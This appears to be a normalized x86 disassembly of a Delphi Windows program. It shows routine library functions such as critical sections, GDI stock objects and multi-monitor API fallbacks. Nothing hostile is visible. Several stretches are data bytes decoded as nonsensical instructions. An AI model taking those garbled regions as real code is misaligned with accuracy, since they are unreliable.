mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4233c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_423400
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_4235f8
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_423444
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42342c
xor eax eax
push ebp
push sub_4234e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4234ec
mov eax [ ebp - 0x4 ]
call sub_423438
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4234f8
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_4234f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4235d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_421afc
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41cf7c
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41ce60
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412594
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d204
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41d5e0
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_4217b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4235f8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42342c
xor eax eax
push ebp
push sub_423643
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42364a
mov eax [ ebp - 0x4 ]
call sub_423438
retn
mov esp ebp
pop ebp
retn
sub_42364a
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_40326c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42342c
xor eax eax
push ebp
push sub_423643
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42364a
mov eax [ ebp - 0x4 ]
call sub_423438
retn
mov esp ebp
pop ebp
retn
sub_423670
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c1d4
push eax
mov eax ebx
call sub_41c1d4
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_423444
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4236a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423771
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423778
retn
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
call sub_40326c
call sub_420770
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a44
sub_42377c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423280
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_4232fc
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41b918 ]
call sub_41b98c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b918 ]
call sub_41b98c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b918 ]
call sub_41b98c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4233c8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413bdc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413bdc
mov [ rw-data ] eax
mov ecx sub_41c1e4
mov edx sub_41c1f4
mov eax [ sub_41a9fc ]
call sub_413390
mov ecx r-xdata
mov edx sub_41c3fc
mov eax [ r-xdata ]
call sub_413390
sub_423888
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4238ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238b4
retn
sub_42390d
cmp [ ecx ] eax
dec eax
cmp al [ edx ]
mov al [ 0x1c004138 ]
cmp [ ecx ] eax
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x8427bee
add [ eax ] al
add [ eax ] ch
cmp [ edx ] eax
mov ah 0x34
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
sar [ edx ] 0x1
inc edx
add [ ebx + edi ] dh
inc edx
add [ ebx + edi ] dl
inc edx
add [ eax ] al
cmp eax [ edx ]
push es
je r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
sar [ edx ] 0x1
inc edx
add [ edx + ebp + 0x40 ] dh
add [ ebx + edi ] dl
inc edx
add [ eax ] al
cmp eax [ edx ]
or al 0x54
dec edi
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004239 ] al
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
mov ecx ebx
mov edx edi
mov eax esi
call sub_413bd8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
mov eax edi
call sub_40326c
dec esp
imul esi [ ebx + 0x74 ] 0xdc00408d
cmp [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4239f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_423a48
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413bd8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_40326c
sub_423a8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_423ad0
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_423b14
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4138b8
mov eax esi
pop esi
pop ebx
retn
sub_423b40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423b65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b6c
retn
sub_423c3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423c61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c68
retn
sub_423c74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_423d33
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d3a
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_423c74
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fbc
sub_423d5c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_423c74
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_423de4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_423c74
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_423e74
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_423c74
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_423de4
sub_423f0a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_423c74
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_423f8b
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_423c74
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424078
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_423c74
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42414c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_423c74
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424220
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_423c74
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4243bb
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4243e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243e8
retn
sub_4243fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424421
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424428
retn
sub_424434
cmp [ edx + eax * 2 ] al
prefetchw [ ecx + 0x48 ]
insb
dec eax
insb
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424428
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
inc ebp
inc edx
add [ eax + eax ] cl
add [ eax ] al
in al dx
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x44a07265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
jmp [ esp + eax * 2 + 0x110f0042 ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jae r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x4004244 ] ah
add [ eax ] al
add [ edi ] cl
push esp
dec eax
insb
jns r-xdata
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
inc ebp
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x424470c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc al 0x45
dec eax
insb
jo r-xdata
inc eax
add [ edx + esi ] al
outsb
je r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
add ah ch
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4251c7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
imul ebp [ edi + 0x6e ] 0x4000408d
inc esi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x46 ] dl
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x44dc7265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42455cc0 ]
inc ebp
inc edx
add bh bh
[ eax * 2 + 0x150f0042 ]
dec ecx
push ebx
jo r-xdata
jo r-xdata
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
inc esp
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x4244e0c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404010
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
add al 0x0
jo r-xdata
lea eax [ eax ]
fadd [ ebp + 0x42 ]
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x45dc0040 ]
inc edx
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
jmp r-xdata
int3
mov eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251ce
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a44
lea eax [ ebp - 0x8 ]
call sub_405628
retn
inc ebx
